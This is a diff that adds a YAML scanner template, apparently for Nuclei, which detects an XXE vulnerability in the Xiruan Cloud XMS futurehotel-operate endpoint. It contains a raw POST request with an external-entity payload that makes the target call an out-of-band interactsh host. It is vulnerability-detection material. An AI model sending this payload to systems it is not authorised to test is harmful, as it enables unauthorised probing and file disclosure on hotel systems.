@@ -1,0 +1,35 @@
+id: xiruan-futurehotel-operate-xxe
+info:
+  name: 西软云XMS-futurehotel-operate 接口存在XXE漏洞
+  author: leadlife
+  severity: high
+  description: 西软云XMS futurehotel-operate 接口存在XXE漏洞，攻击者可利用该漏洞读取任意文件。
+  reference: 
+    - https://github.com/zan8in/afrog/blob/3ea4d34414bcc09b9e25a3f338294eca87e178ce/pocs/afrog-pocs/vulnerability/xiruanyun-xms-futurehotel-operate-xxe.yaml#L17
+  classification:
+    cve-id: 
+  metadata:
+    verified: false
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: oob,oast,xxe,xiruan
+
+http:
+  - raw:
+      - |
+        POST /XopServerRS/rest/futurehotel/operate HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+        
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "{{interactsh-url}}"> %remote;]>
+      
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
